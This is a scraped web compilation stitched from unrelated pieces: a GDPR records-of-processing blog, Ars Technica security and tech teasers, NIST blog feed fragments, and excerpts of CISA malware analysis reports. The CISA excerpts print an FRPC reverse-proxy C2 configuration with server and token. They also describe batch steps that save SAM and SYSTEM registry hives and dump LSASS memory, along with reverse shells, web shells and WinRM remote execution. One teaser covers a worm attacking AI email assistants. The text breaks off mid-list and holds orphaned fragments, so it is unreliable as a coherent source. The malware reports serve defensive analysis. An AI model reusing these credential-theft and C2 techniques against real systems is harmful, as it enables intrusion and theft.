&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;Depending on your needs, you may want to use slightly different columns, but I recommend tracking your risks in your ROPAs, as this takes advantage of the fact you’ve listed out all your processing activities. In effect, those records are your &lt;strong&gt;asset register&lt;/strong&gt; – a key element to an asset-based risk assessment, which is a skill that’s fundamental to data protection, privacy and information security management&lt;/p&gt;



&lt;p&gt;You can further simplify things by colour-coding your risks to highlight those that require further action. You can also use Excel formulas to automate certain columns, or even use &lt;a href="https://www.itgovernance.co.uk/cybercomply" rel="noreferrer noopener" target="_blank"&gt;dedicated software&lt;/a&gt; to fully automate the process and save you a lot of time, as well as the risk of not saving your work and having to start all over again.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="Bringing-together-ROPAs-data-flow-mapping-and-DPIAs"&gt;Bringing together ROPAs, data flow mapping and DPIAs&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Let’s wrap things up. Where do organisations begin with GDPR compliance?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;With their ROPAs. If you don’t have a clear overview of your processing activities, it becomes virtually impossible to meet your other legal requirements.&lt;/p&gt;



&lt;p&gt;It’s akin to implementing cyber security without a &lt;a href="https://www.itgovernance.co.uk/shop/product/information-security-risk-assessment-workshop" rel="noreferrer noopener" target="_blank"&gt;risk assessment&lt;/a&gt; – if you don’t know what your threats and vulnerabilities are, you can’t implement cyber defences effectively.&lt;/p&gt;



&lt;p&gt;Compiling your ROPAs tells you what personal data you’re processing, along with how, why, when and by whom. Just those basics make for a decent start to compliance.&lt;/p&gt;



&lt;p&gt;In time, you can add columns and data points not listed in Article 30 but that&amp;nbsp;&lt;em&gt;are&lt;/em&gt;&amp;nbsp;mentioned elsewhere in the GDPR. If creating your ROPAs is becoming complex, there are guides, software and consultancy that can support this project. &amp;nbsp;You can also reflect good practice, for example by including data flow maps. These include information about DPIAs, as well as information about lawful basis, applicable data subject rights, and so on. Take GDPR compliance one step at a time, using your ROPAs as your base.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

In its WWDC keynote today, Apple stressed that the new "Apple Intelligence" system it's integrating into its products will use a new "&lt;a href="https://security.apple.com/blog/private-cloud-compute/"&gt;Private Cloud Compute&lt;/a&gt;" to ensure any data processed on its cloud servers is protected in a transparent and verifiable way.&lt;/p&gt;
&lt;p&gt;"You should not have to hand over all the details of your life to be warehoused and analyzed in someone's AI cloud," Apple Senior VP of Software Engineering Craig Federighi said.&lt;/p&gt;
&lt;h2&gt;Trust, but verify&lt;/h2&gt;
&lt;p&gt;Part of what Apple calls "a brand new standard for privacy and AI" is achieved through on-device processing. Federighi said "many" of Apple's generative AI models can run entirely on a device powered by an A17+ or M-series chips, eliminating the risk of sending your personal data to a remote server.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/ai/2024/06/apples-ai-promise-your-data-is-never-stored-or-made-accessible-by-apple/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Credential_stuffing"&gt;Credential stuffing&lt;/a&gt; is an attack in which usernames and passwords exposed in one leak are tried out against other accounts, typically using automated scripts. When people reuse usernames and passwords across services or make small, easily intuited changes between them, actors can gain access to accounts with even more identifying information and access.&lt;/p&gt;
&lt;p&gt;In the case of the Roku attacks, that meant access to stored payment methods, which could then be used to buy streaming subscriptions and Roku hardware. &lt;a href="https://www.roku.com/blog/protecting-your-roku-account"&gt;Roku wrote on its blog&lt;/a&gt;, and in &lt;a href="https://oag.ca.gov/system/files/Template%20Notification%203-8-2024.pdf"&gt;a mandated data breach report&lt;/a&gt;, that purchases occurred in "less than 400 cases" and that full credit card numbers and other "sensitive information" was not revealed.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2024/04/roku-forcing-2-factor-authentication-after-breach-of-600k-accounts/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Despite the angst among policymakers, security experts, and competitors, Microsoft faced no consequences for its latest embarrassing failure. The United States government kept buying and using Microsoft products, and senior officials refused to publicly rebuke the tech giant. It was another reminder of how insulated Microsoft has become from virtually any government accountability, even as the Biden administration vows to make powerful tech firms take more responsibility for America’s cyber defense.&lt;/p&gt;

                  &lt;/div&gt;
      &lt;/figure&gt;
That state of affairs is unlikely to change even in the wake of &lt;a href="https://www.cisa.gov/sites/default/files/2024-04/CSRB_Review_of_the_Summer_2023_MEO_Intrusion_Final_508c.pdf"&gt;a new report&lt;/a&gt; by the Cyber Safety Review Board (CSRB), a group of government and industry experts, which lambasts Microsoft for failing to prevent one of the worst hacking incidents in the company’s recent history. The report says Microsoft’s “security culture was inadequate and requires an overhaul.”&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2024/04/why-the-us-governments-overreliance-on-microsoft-is-a-big-problem/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Not that the company's hardware releases to date have been perfect—each Framework Laptop 13 model has had quirks and flaws that range from &lt;a href="https://knowledgebase.frame.work/expansion-card-functionality-on-framework-laptop-13-amd-ryzen-7040-series-SkrVx7gAh"&gt;minor&lt;/a&gt; to &lt;a href="https://arstechnica.com/gadgets/2022/07/review-frameworks-next-gen-laptop-follows-through-on-its-upgradeable-promises/4/"&gt;quite significant&lt;/a&gt;, and the &lt;a href="https://arstechnica.com/gadgets/2024/01/review-frameworks-laptop-16-is-unique-laudable-fascinating-and-flawed/"&gt;Laptop 16's&lt;/a&gt; upsides struggle to balance its downsides.

Startups and tech companies are building AI agents and ecosystems on top of the systems that can &lt;a href="https://www.wired.com/story/ai-chatbots-chatgpt-boring-chores/"&gt;complete boring chores for you&lt;/a&gt;: think automatically making calendar bookings and potentially &lt;a href="https://www.wired.com/story/fast-forward-tested-next-gen-ai-assistant/"&gt;buying products&lt;/a&gt;. But as the tools are given more freedom, it also increases the potential ways they can be attacked.&lt;/p&gt;
&lt;p&gt;Now, in a demonstration of the risks of connected, autonomous AI ecosystems, a group of researchers has created one of what they claim are the first generative AI worms—which can spread from one system to another, potentially stealing data or deploying malware in the process. “It basically means that now you have the ability to conduct or to perform a new kind of cyberattack that hasn't been seen before,” says Ben Nassi, a Cornell Tech researcher behind the research.&lt;/p&gt;
&lt;p&gt;Nassi, along with fellow researchers Stav Cohen and Ron Bitton, created the worm, dubbed Morris II, as a nod to the original &lt;a href="https://www.wired.com/2011/07/0726first-computer-fraud-indictment/"&gt;Morris computer worm&lt;/a&gt; that caused chaos across the Internet in 1988. In a &lt;a href="https://sites.google.com/view/compromptmized"&gt;research paper and website &lt;/a&gt;shared exclusively with WIRED, the researchers show how the AI worm can attack a generative AI email assistant to steal data from emails and send spam messages—breaking some security protections in ChatGPT and Gemini in the process.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/ai/2024/03/researchers-create-ai-worms-that-can-spread-from-one-system-to-another/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That malware, which worked as a botnet for the Russian hacking group &lt;a href="https://arstechnica.com/features/2023/05/is-cybersecurity-an-unsolvable-problem/"&gt;Fancy Bear&lt;/a&gt;, was removed in January 2024 under a secret court order as part of "Operation Dying Ember," according to the FBI's director. It affected routers running Ubiquiti's EdgeOS, but only those that had not changed their default administrative password. Access to the routers allowed the hacking group to "conceal and otherwise enable a variety of crimes," the DOJ claims, including spearphishing and credential harvesting in the US and abroad.&lt;/p&gt;
&lt;p&gt;Unlike previous attacks by Fancy Bear—that the DOJ ties to GRU Military Unit 26165, which is also known as APT 28, Sofacy Group, and Sednit, among other monikers—the Ubiquiti intrusion relied on a known malware, &lt;a href="https://arstechnica.com/information-technology/2020/03/lilin-dvrs-and-zyxel-nas-devices-have-been-active-exploit-for-months/"&gt;Moobot&lt;/a&gt;. Once infected by "Non-GRU cybercriminals," GRU agents installed "bespoke scripts and files" to connect and repurpose the devices, according to the DOJ.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2024/02/doj-turns-tables-on-russian-hackers-uses-their-malware-to-wipe-out-botnet/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

His fork, &lt;a href="http://freenginx.org/"&gt;freenginx&lt;/a&gt;, is "going to be run by developers, and not corporate entities," &lt;a href="https://mailman.nginx.org/pipermail/nginx-devel/2024-February/K5IC6VYO2PB7N4HRP2FUQIBIBCGP4WAU.html"&gt;writes Maxim Dounin&lt;/a&gt;, and will be "free from arbitrary corporate actions."&lt;/p&gt;
&lt;p&gt;Dounin is one of the earliest and &lt;a href="http://hg.nginx.org/nginx/"&gt;still most active coders&lt;/a&gt; on the open source Nginx project and one of the first employees of Nginx, Inc., a company created in 2011 to commercially support the steadily growing web server. Nginx is now used on roughly &lt;a href="https://w3techs.com/technologies/overview/web_server"&gt;one-third of the world's &lt;/a&gt;web servers, ahead of Apache.&lt;/p&gt;
&lt;h2&gt;A tricky history of creation and ownership&lt;/h2&gt;
&lt;p&gt;Nginx Inc. was acquired by Seattle-based networking firm F5 in 2019. Later that year, two of Nginx's leaders, Maxim Konovalov and Igor Sysoev, were &lt;a href="https://arstechnica.com/information-technology/2019/12/russian-media-group-rambler-attempting-to-hold-nginx-hostage/"&gt;detained and interrogated in their homes by armed Russian state agents&lt;/a&gt;. Sysoev's former employer, Internet firm &lt;a href="https://en.wikipedia.org/wiki/Rambler_(portal)"&gt;Rambler&lt;/a&gt;, claimed that it owned the rights to Nginx's source code, as it was developed during Sysoev's tenure at Rambler (where Dounin also worked). While the criminal charges and rights do not appear to have materialized, the implications of a Russian company's intrusion into a popular open source piece of the web's infrastructure caused some alarm.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2024/02/nginx-key-developer-starts-a-freenginx-fork-after-dispute-with-parent-firm/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a cross platform full featured FRP that is written in GO language (Golang) and packed using Ultimate Packer for Executables (UPX). This utility can be used to locate servers behind a network firewall or obscured through NAT. It includes the KCP (no acronym) network protocol that allows for error-checked and anonymous delivery of data streams using the User Datagram Protocol (UDP) with packet level encryption support.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The program contains two different multiplexer libraries that can bi-directionally stream data over a NAT’d network. It also contains a command line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh). In addition, the utility features a unique capability that detects if the utility is executed from the command line or by double-clicking.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;By default it is configured to connect to an Internet Protocol (IP) address on Transmission Control Protocol (TCP) port 1080. It must receive a specially formed packet from the C2 for the utility to deploy on the system.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit Windows executable file that is packed using UPX. This packed file contains a compiled version of an open-source tool published on GitHub called "FRPC". The "FRPC" is a command-line tool written in Golang that is designed to open a reverse proxy between the compromised system and the TA's C2 server.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;When the "FRPC" is installed and executed on the compromised system, it attempts to establish a connection with the Fast Reverse Proxy Server (FRPS) using the reverse proxy method to allow the TA to control the compromised system. This "FRPC" application supports encryption, compression, and allows easy token authentication. It also supports the protocols below:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin protocols--&amp;nbsp;&lt;br /&gt;Transmission Control Protocol (TCP)&amp;nbsp;&lt;br /&gt;User Datagram Protocol (UDP)&amp;nbsp;&lt;br /&gt;An alternative Hypertext Transfer Protocol (HTTP)&amp;nbsp;&lt;br /&gt;An alternative Hypertext Transfer Protocol Secure (HTTPS)&amp;nbsp;&lt;br /&gt;--End protocols--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Displayed below is the "FRPC" tool configuration that contains the network communication method, the remote "FRPS" server's public Internet Protocol (IP) address and port numbers:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin configuration--&amp;nbsp;&lt;br /&gt;[common]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_addr = 192.168.18.111&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_port = 8081&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_addrs = [Default IP addresses]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_ports = 8443,8443,8443&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;token = 1kyRdFmuk0i25JbCJmtift1c9VA05VBS&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;protocol = tcp&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;tls_enable = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;disable_custom_tls_first_byte = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;log_level = debug&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;[plugin_socks5]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;type = tcp&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;remote_port = 1080&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;plugin = socks5&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;use_encryption = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;use_compression = true&amp;nbsp;&lt;br /&gt;--End configuration--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Displayed below are the command-line usages and flags of the "FRPC" tool:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin usages and flags--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Usage:&amp;nbsp;&lt;br /&gt;frpc [flags]&amp;nbsp;&lt;br /&gt;frpc [command]&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Available Commands:&amp;nbsp;&lt;br /&gt;help &amp;nbsp;&amp;nbsp;&amp;nbsp;

&lt;h3&gt;Recommendations&lt;/h3&gt;

&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

Since then, many organizations have found it highly valuable for building or improving their privacy programs. We’ve also been able to add a variety of resources to support its implementation. We’re proud of how much has been accomplished in just a few short years, but we’re not resting on our laurels. As another, more famous, Dylan once said, “the times they are a-changin’.” For example, the past year has seen the release of the NIST AI Risk</description><guid isPermaLink="false">https://www.nist.gov/node/1837676</guid></item><item><title>Privacy Attacks in Federated Learning</title><link>https://www.nist.gov/blogs/cybersecurity-insights/privacy-attacks-federated-learning</link><description>This post is part of a series on privacy-preserving federated learning. The series is a collaboration between NIST and the UK government’s Centre for Data Ethics and Innovation. Learn more and read all the posts published to date at NIST’s Privacy Engineering Collaboration Space or the CDEI blog . Our first post in the series introduced the concept of federated learning—an approach for training AI models on distributed data by sharing model updates instead of training data.

The series is a collaboration between CDEI and NIST. Advances in machine learning and AI, fueled by large-scale data availability and high-performance computing, have had a significant impact across the world in the past two decades. Machine learning techniques shape what information we see online, influence critical business decisions, and aid scientific discovery, which is driving advances in healthcare, climate modelling, and more.

&lt;p&gt;In the piece, Schneier notes that the existing landscape of electronic surveillance has already transformed the modern era, becoming the &lt;a href="https://www.schneier.com/blog/archives/2013/11/surveillance_as_1.html"&gt;business model of the Internet&lt;/a&gt;, where our digital footprints are constantly tracked and analyzed for commercial reasons. Spying, by contrast, can take that kind of economically inspired monitoring to a completely new level:&lt;/p&gt;
&lt;p&gt;"Spying and surveillance are different but related things," Schneier writes. "If I hired a private detective to spy on you, that detective could hide a bug in your home or car, tap your phone, and listen to what you said.

Despite its benefits, it comes with privacy and security risks. An increasing number of interconnected devices increases the attack surface. In addition, there are also increased supply chain vulnerabilities and network visibility issues (companies may have issues identifying attacks since there may be a lot of new web traffic from mobile devices and/or more sophistication when it comes to attacks).

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a Windows batch file called a.bat that is used to execute the file called a.exe with the file called a.dll as an argument. The output is printed to a file named 'z.txt' located in the path C:\Windows\Tasks. Next, a.bat pings the loop back internet protocol (IP) address 127.0.0[.]1 three times.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The next command it runs is reg save to save the HKLM\SYSTEM registry hive into the C:\Windows\tasks\em directory. Again, a.bat pings the loop back address 127.0.0[.]1 one time before executing another reg save command and saves the HKLM\SAM registry hive into the C:\Windows\Task\am directory. Next, a.bat runs three makecab commands to create three Cabinet (.cab) files from the previously mentioned saved registry hives and one file named C:\Users\Public\a.png. The names of the .cab files are as follows:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Start names and paths of .cab files created--&lt;br /&gt;&lt;br /&gt;
			c:\windows\tasks\em.cab&lt;br /&gt;&lt;br /&gt;
			c:\windows\tasks\am.cab&lt;br /&gt;&lt;br /&gt;
			c:\windows\tasks\a.cab&lt;br /&gt;&lt;br /&gt;
			--End names and paths of .cab files created--&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a 64-bit Windows command-line executable called a.exe that is executed by a.bat. This file issues the Remote Procedure Call (RPC) ncalrpc:[lsasspirpc] to the RPC end point to provide a file path to the LSASS on the infected machine. Once the file path is returned, the malware loads the accompanying DLL file called a.dll into the running LSASS process. If the DLL is correctly loaded, then the malware outputs the message "[*]success" in the console.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file a.exe. The file a.exe loads this file into the running LSASS process on the infected machine. The file a.dll calls the Windows API CreateFileW to create a file called a.png in the path C:\Users\Public.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Next, a.dll loads DbgCore.dll then utilizes MiniDumpWriteDump function to dump LSASS process memory to disk. If successful, the dumped process memory is written to a.png. Once this is complete, the file a.bat specifies that the file a.png is used to create the cabinet file called a.cab in the path C:\Windows\Tasks.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a Python script called a.py that attempts to leverage WinRM to establish a session. The script attempts to authenticate to the remote machine using NT LAN Manager (NTLM) if the keyword "hashpasswd" is present. If the keyword "hashpasswd" is not present, then the script attempts to authenticate using basic authentication. Once a WinRM session is established with the remote machine, the script has the ability to execute command line arguments on the remote machine. If there is no command specified, then a default command of “whoami” is run.&lt;/p&gt;
&lt;h5&gt;Screenshots&lt;/h5&gt;




  
      




      &lt;strong&gt;Figure 3. - &lt;/strong&gt;This is the portion of the Python script that shows the command line options.
  




  
      




      &lt;strong&gt;Figure 4. -&lt;/strong&gt; This is the function showing how the script decides between using NTLM or basic authentication based on the keyword "hashpasswd".

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This file is a SUBMARINE artifact, an empty text/data file. The name of the file is designed to exploit a vulnerability on the target environment where the base64 string within the file name will be executed on the Linux shell. The code in Figure 1 will change the permissions of any directory/file/path with that begins with '/root/mac' to executable. Then, anything containing the string 'mach*' in the directory/file/path '/root/mach' are executed.&lt;/p&gt;
&lt;h5&gt;Screenshots&lt;/h5&gt;

&lt;p&gt;This artifact, belonging to the SKIPJACK malware family, is a Perl script that enumerates file system information. This script first checks the file system by opening '/etc/fstab.main/,' then checks the value against the array 'ARGV[0]', which perl automatically provides to hold all values from the command line in. The script will print either 'xfs' or hda depending on the type of file system it finds. The script contains a second if statement that gathers more information about the type of file system. This second if statement contains the regular expression '/^\/dev\/(\S+)\d+\s+\/\s+(\S+)/,' which translates to '/etc/fstab.' The script uses this second half of the code to check for file system type or information about the partition, which it then prints based on the value of '$requested_data.'&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a trojanized Lua module that has been identified as a "SEASPRAY" variant. SEASPRAY registers an event handler for all incoming email attachments. This variant checks for the sender and the string “obt”, which is hard coded in the lua file. If that string is found the malware uses os.execute to execute the file “saslautchd”, see Figure 3.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact, belonging to the WHIRLPOOL malware family, is a 64-bit Linux Executable and Linkable Format (ELF) file. The malware checks processor hardware and architecture, to include if the target system uses AMD or Intel, see Figure 4. Figure 5 shows the malware determining the kernel version by invoking the 'uname' command line function and exploring the contents of the '/proc/sys/kernel/osrelease' file. Figures 6, 7, and 8 show the malware's capacity to connect to a remote address, and then create a new process with the command line argument '/bin/sh.' The connection to a remote host and the invocation of a bash shell are the two components/phases used by reverse shells. Figure 9 shows the malware's capacity to interact with the Name Service Cache Daemon by creating and connecting to a Unix socket at ./var/run/nscd/socket.' This socket can cache Domain Name System (DNS) requests. Rather than listening on port 53, it listens on the socket file itself, for data from other programs/processes. Figure 10 shows the malware's capacity to perform DNS resolution, using the system call 'sys_getpeername.' The malware accesses the target's environment variables.

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact, belonging to the SALTWATER malware family, is a 32-bit Linux Shared Object (.so) file. The malware can intake data over the network, using a previously established socket, with the 'recv' function as shown in Figure 11. Figure 12 shows the malware creating a new thread, within the calling process. This is thread injection and it can inject two different functions. Figure 13 shows the first function that can perform DNS resolution. Figures 14 and 15 show the second function. The second function can establish communications, over the network, using a TLS version 1 connection. Lastly, using 'popen', the malware can execute any shell command with the same privileges as its calling process.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;

&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA received 4 files for analysis from an incident response engagement conducted at an Aeronautical Sector organization.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			2 files (bitmap.exe, wkHPd.exe) are identified as variants of Metasploit (Meterpreter) and designed to connect and receive unencrypted payloads from their respective command and control (C2) servers. Note: Metasploit is an open source penetration testing software; Meterpreter is a Metasploit attack payload that runs an interactive shell. These executables are used as attack payloads to run interactive shells, allowing a malicious actor the ability to control and execute code on a system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			2 files (resource.aspx, ConfigLogin.aspx) are Active Server Pages (ASPX) web shells designed to execute remote JavaScript code on the victim server.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			CISA has provided indicators of compromise (IOCs) and YARA rules for detection within this Malware Analysis Report (MAR).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For more information about this compromise, see Joint Cybersecurity Advisory &lt;a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a" title="Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475"&gt;Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475&lt;/a&gt;.&lt;/p&gt;

The 'unsafe' context keyword is intentionally obfuscated to bypass security protocols.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
